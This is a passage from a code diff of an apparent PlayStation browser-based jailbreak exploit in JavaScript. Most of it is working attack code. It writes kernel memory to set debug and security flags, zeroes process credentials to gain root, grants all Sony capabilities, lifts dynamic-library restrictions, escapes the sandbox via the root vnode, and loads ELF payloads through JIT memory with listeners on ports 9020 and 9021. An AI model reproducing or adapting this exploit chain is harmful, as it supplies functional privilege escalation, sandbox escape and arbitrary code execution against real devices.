+                await dump_net(dump_page, 0x4000);
+                dump_addr = dump_addr.add32(0x4000);
+            }
+
+            debug_log("[+] kernel dump should not reach here we should have died by now");
+        }
 
         function get_kaddr(offset) {
-            return krw.ktextBase.add32(offset);
+            return kbase.add32(offset);
         }
 
         // Set security flags
-        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
-        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
+        let security_flags = await kernel_read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
+        await kernel_write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);
 
         // Set targetid to DEX
-        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
+        await kernel_write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);
 
         // Set qa flags and utoken flags for debug menu enable
-        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
-        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
+        let qaf_dword = await kernel_read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
+        await kernel_write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);
 
-        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
-        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
-        await log("Enabled debug menu", LogLevel.INFO);
+        let utoken_flags = await kernel_read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
+        await kernel_write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
+        debug_log("[+] enabled debug menu");
 
         // Patch creds
         let cur_uid = await chain.syscall(SYS_GETUID);
-        await log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);
+        debug_log("[+] escalating creds (current uid=0x" + cur_uid + ")");
 
-        await krw.write4(krw.procUcredAddr.add32(0x04), 0); // cr_uid
-        await krw.write4(krw.procUcredAddr.add32(0x08), 0); // cr_ruid
-        await krw.write4(krw.procUcredAddr.add32(0x0C), 0); // cr_svuid
-        await krw.write4(krw.procUcredAddr.add32(0x10), 1); // cr_ngroups
-        await krw.write4(krw.procUcredAddr.add32(0x14), 0); // cr_rgid
+        await kernel_write4(proc_ucred_addr.add32(0x04), 0); // cr_uid
+        await kernel_write4(proc_ucred_addr.add32(0x08), 0); // cr_ruid
+        await kernel_write4(proc_ucred_addr.add32(0x0C), 0); // cr_svuid
+        await kernel_write4(proc_ucred_addr.add32(0x10), 1); // cr_ngroups
+        await kernel_write4(proc_ucred_addr.add32(0x14), 0); // cr_rgid
 
         // Escalate sony privs
-        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
-        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
-        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
-        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);                              // cr_sceAttr[0]
+        await kernel_write8(proc_ucred_addr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
+        await kernel_write8(proc_ucred_addr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
+        await kernel_write8(proc_ucred_addr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
+        await kernel_write1(proc_ucred_addr.add32(0x83), 0x80);                              // cr_sceAttr[0]
 
         // Remove dynlib restriction
-        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
-        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);
+        let proc_pdynlib_offset = curproc_addr.add32(0x3E8);
+        let proc_pdynlib_addr = await kernel_read8(proc_pdynlib_offset);
 
         let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
-        await krw.write4(restrict_flags_addr, 0);
+        await kernel_write4(restrict_flags_addr, 0);
 
         let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
-        await krw.write8(libkernel_ref_addr, new int64(1, 0));
+        await kernel_write8(libkernel_ref_addr, new int64(1, 0));
 
         cur_uid = await chain.syscall(SYS_GETUID);
-        await log("We root now? uid=0x" + cur_uid, LogLevel.INFO);
+        debug_log("[+] we root now? uid=0x" + cur_uid);
 
         // Escape sandbox
         let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
-        await log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
-        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
-        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
-        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir
+        debug_log("[+] jailbreaking (in sandbox: " + is_in_sandbox + ")");
+        let rootvnode = await kernel_read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
+        await kernel_write8(proc_fd_addr.add32(0x10), rootvnode); // fd_rdir
+        await kernel_write8(proc_fd_addr.add32(0x18), rootvnode); // fd_jdir
 
         is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
-        await log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);
+        debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
 
         // Patch PS4 SDK version
         if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
-            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
-            await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
+            await kernel_write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
+            debug_log("[+] Patched PS4 SDK version to 99.99");
         }
 
         ///////////////////////////////////////////////////////////////////////
         // Stage 6: loader
         ///////////////////////////////////////////////////////////////////////
 
-        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
+        let dlsym_addr = syscalls[SYS_DYNLIB_DLSYM];
         let jit_handle_store = p.malloc(0x4);
         // let test_store_buf   = p.malloc(0x4);
 
@@ -541,6 +1630,8 @@ async function main(userlandRW, wkOnly = false) {
         let elf_entry_point = 0;
 
         var parse_elf_store = async function (total_sz = -1) {
+            let start = performance.now();
+
             // Parse header
             // These are global variables
             elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
@@ -548,11 +1639,11 @@ async function main(userlandRW, wkOnly = false) {
             elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));
 
             if (elf_program_headers_offset != 0x40) {
-                await log("    ELF header malformed, terminating connection.", LogLevel.ERROR);
+                debug_log("  [!] ELF header malformed, terminating connection.");
                 throw new Error("ELF header malformed, terminating connection.");
             }
 
-            //await log("parsing ELF file (" + total_sz.toString(10) + " bytes)...");
+            //debug_log("[+] parsing ELF file (" + total_sz.toString(10) + " bytes)...");
 
             let text_segment_sz = 0;
             let data_segment_sz = 0;
@@ -581,17 +1672,17 @@ async function main(userlandRW, wkOnly = false) {
                         text_segment_sz = program_memsz;
 
                         // Get exec
-                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
+                        await chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                         await chain.run();
                         let exec_handle = p.read4(jit_handle_store);
 
                         // Get write alias
-                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
+                        await chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                         await chain.run();
                         let write_handle = p.read4(jit_handle_store);
 
                         // Map to shadow mapping
-                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
+                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                         await chain.run();
                         shadow_write_mapping = p.read8(conn_ret_store);
 
@@ -682,6 +1773,10 @@ async function main(userlandRW, wkOnly = false) {
                     }
                 }
             }
+
+            let end = performance.now();
+
+            debug_log("  [+] ELF parsing took " + (end - start) + " ms");
         }
 
         // reuse these plus we can more easily access them
@@ -703,28 +1798,29 @@ async function main(userlandRW, wkOnly = false) {
             }
 
             // Pass master/victim pair to payload so it can do read/write
-            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
-            p.write4(rwpair_mem.add32(0x04), krw.victimSock);
+            p.write4(rwpair_mem.add32(0x00), master_sock);
+            p.write4(rwpair_mem.add32(0x04), victim_sock);
 
             // Arguments to entrypoint
             p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
-            p.write8(args.add32(0x08), krw.pipeMem);        // arg2 = int *rwpipe[2]
+            p.write8(args.add32(0x08), pipe_mem);           // arg2 = int *rwpipe[2]
             p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
-            p.write8(args.add32(0x18), krw.pipeAddr);       // arg4 = uint64_t kpipe_addr
-            p.write8(args.add32(0x20), krw.kdataBase);      // arg5 = uint64_t kdata_base_addr
+            p.write8(args.add32(0x18), pipe_addr);          // arg4 = uint64_t kpipe_addr
+            p.write8(args.add32(0x20), kdata_base);         // arg5 = uint64_t kdata_base_addr
             p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
-
             // Execute payload in pthread
-            await log("    Executing...", LogLevel.INFO);
-            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
-
+            //debug_log("  [+] executing!");
+            await chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
         }
 
+        /**
+         * @returns Promise<number> - The return value of the payload
+         */
         var wait_for_elf_to_exit = async function () {
             // Join pthread and wait until we're finished executing
-            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
+            await chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
             let res = p.read8(test_payload_store).low << 0;
-            await log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);
+            debug_log("  [+] Finished, out = 0x" + res.toString(16));
 
             return res;
         }
@@ -736,22 +1832,19 @@ async function main(userlandRW, wkOnly = false) {
                 await execute_elf_store();
                 return await wait_for_elf_to_exit();
             } catch (error) {
-                await log("    Failed to load local elf: " + error, LogLevel.ERROR);
-                return -1;
+                debug_log("  [!] Failed to load local elf: " + error);
             }
         }
 
         if (await load_local_elf("elfldr.elf") == 0) {
-            await log(`elfldr listening on ${ip.ip}:9021`, LogLevel.INFO);
-            await new Promise(resolve => setTimeout(resolve, 8000));
-            await load_local_elf("etaHEN.bin");
-            await log(`EtaHEN Successfully Loaded`, LogLevel.INFO);
-            EndTimer();
+            debug_log(`[+] elfldr listening on ${window.ip.ip}:9021`);
             is_elfldr_running = true;
         } else {
-            await log("elfldr exited with non-zero code, port 9021 will likely not work", LogLevel.ERROR);
+            debug_log("[!] elfldr exited with non-zero code, port 9021 will likely not work");
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
+
+        // const SOCK_NONBLOCK = 0x20000000; // for future reference, this is ignored if we're not jailbroken and explicitly setting it with fcntl returns SCE_KERNEL_ERROR_EACCES (at least on 4.03)
 
         var elf_loader_socket_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
         if (elf_loader_socket_fd <= 0) {
@@ -759,7 +1852,7 @@ async function main(userlandRW, wkOnly = false) {
         }
 
         var elf_loader_sock_addr_store = p.malloc(0x10, 1);
-        build_addr(p, elf_loader_sock_addr_store, AF_INET, htons(9020), 0);
+        build_addr(elf_loader_sock_addr_store, AF_INET, htons(9020), 0);
 
         let SOL_SOCKET = 0xFFFF;
         let SO_REUSEADDR = 0x0004;
@@ -784,7 +1877,7 @@ async function main(userlandRW, wkOnly = false) {
 
         var conn_addr_store = p.malloc(0x10, 1);
         var conn_addr_size_store = p.malloc(0x4, 1);
-
+        
         var select_readfds_size = 1024 / 8;
         var select_readfds = p.malloc(select_readfds_size, 1);
 
@@ -793,13 +1886,35 @@ async function main(userlandRW, wkOnly = false) {
         p.write8(timeout, 0); // tv_sec
         p.write8(timeout.add32(0x8), 50000); // tv_usec - 50000 us = 50 ms
 
-        await log("elf loader listening on port 9020", LogLevel.INFO);
+        debug_log("[+] elf loader listening on port 9020");
     }
 
     async function fstat(fd, stat_buf) {
         if (stat_buf.backing.byteLength < 0x78) {
             throw new Error("Stat buffer size too small");
         }
+
+        // struct stat {
+        //     0 __dev_t   st_dev;		/* inode's device */
+        //     4 ino_t	  st_ino;		/* inode's number */
+        //     8 mode_t	  st_mode;		/* inode protection mode */
+        //     10 nlink_t	  st_nlink;		/* number of hard links */
+        //     12 uid_t	  st_uid;		/* user ID of the file's owner */
+        //     16 gid_t	  st_gid;		/* group ID of the file's group */
+        //     20 __dev_t   st_rdev;		/* device type */
+        //     24 struct	timespec st_atim;	/* time of last access */
+        //     40 struct	timespec st_mtim;	/* time of last data modification */
+        //     56 struct	timespec st_ctim;	/* time of last file status change */
+        //     72 off_t	  st_size;		/* file size, in bytes */
+        //     80 blkcnt_t st_blocks;		/* blocks allocated for file */
+        //     88 blksize_t st_blksize;		/* optimal blocksize for I/O */
+        //     92 fflags_t  st_flags;		/* user defined flags for file */
+        //     96 __uint32_t st_gen;		/* file generation number */
+        //     100 __int32_t st_lspare;
+        //     104 struct timespec st_birthtim;	/* time of file creation */
+        //     unsigned int :(8 / 2) * (16 - (int)sizeof(struct timespec));
+        //     unsigned int :(8 / 2) * (16 - (int)sizeof(struct timespec));
+        // };
 
         let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;
 
@@ -908,6 +2023,18 @@ async function main(userlandRW, wkOnly = false) {
                 let loops = 0;
                 while (offset < bytes_read) {
                     loops++;
+                    // struct dirent {
+                    //     __uint32_t d_fileno;		/* file number of entry */
+                    //     __uint16_t d_reclen;		/* length of this record */
+                    //     __uint8_t  d_type; 		/* file type, see below */
+                    //     __uint8_t  d_namlen;		/* length of string in d_name */
+                    // #if __BSD_VISIBLE
+                    // #define	MAXNAMLEN	255
+                    //     char	d_name[MAXNAMLEN + 1];	/* name must be no longer than this */
+                    // #else
+                    //     char	d_name[255 + 1];	/* name must be no longer than this */
+                    // #endif
+                    // };
 
                     let d_fileno = bufferDataView.getUint32(offset, true);
                     let d_reclen = bufferDataView.getUint16(offset + 4, true);
@@ -954,7 +2081,7 @@ async function main(userlandRW, wkOnly = false) {
 
         async function unlink(path) {
             p.writestr(elf_store, path);
-            return await chain.syscall_int32(SYS_UNLINK, elf_store);
+            return (await chain.syscall(SYS_UNLINK, elf_store)) << 0;
         }
 
         for (let user_id of user_ids) {
@@ -975,7 +2102,7 @@ async function main(userlandRW, wkOnly = false) {
             throw new Error("Failed to create socket");
         }
 
-        build_addr(p, send_buffer_to_port.sock_addr_store, AF_INET, htons(port), 0x0100007F);
+        build_addr(send_buffer_to_port.sock_addr_store, AF_INET, htons(port), 0x0100007F);
 
         let connect_res = (await chain.syscall(SYS_CONNECT, sock, send_buffer_to_port.sock_addr_store, 0x10)).low << 0;
         if (connect_res < 0) {
@@ -1003,24 +2130,27 @@ async function main(userlandRW, wkOnly = false) {
     sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);
 
     let ports = wkOnly ? "" : "9020";
-    if (is_elfldr_running) {
+    if (is_elfldr_running){
         if (ports) {
             ports += ", ";
         }
         ports += "9021";
     }
 
-    document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;
+    document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${window.ip.ip}</span> (port: ${ports}) (${window.ip.name})`;
 
+    /** @type {Array<{payload_info: PayloadInfo, toast: HTMLElement}>} */
     let queue = [];
 
     window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
+        /** @type {PayloadInfo} */
         let payload_info = event.detail;
         let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
         queue.push({ payload_info, toast });
     });
 
-    await new Promise(resolve => setTimeout(resolve, 300));
+    debug_log("[+] Done, switching to payloads screen...");
+    await new Promise(resolve => setTimeout(resolve, 1000));
     await switchPage("payloads-view");
 
 
@@ -1028,7 +2158,7 @@ async function main(userlandRW, wkOnly = false) {
 
         if (queue.length > 0) {
 
-            let { payload_info, toast } = (queue.shift());
+            let { payload_info, toast } = /** @type {{payload_info: PayloadInfo, toast: HTMLElement}} */ (queue.shift());
 
             try {
                 if (payload_info.customAction) {
@@ -1043,7 +2173,7 @@ async function main(userlandRW, wkOnly = false) {
 
                     if (!payload_info.toPort) {
                         if (wkOnly) {
-                            throw new Error();
+                            throw new Error(); // unreachable, in wkOnly theres only buttons for payloads with toPort
                         }
 
                         updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
@@ -1137,4 +2267,4 @@ async function main(userlandRW, wkOnly = false) {
 
 let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
-fwScript.setAttribute('src', `${window.fw_str}.js`);
+fwScript.setAttribute('src', `offsets/${fw_str}.js`);
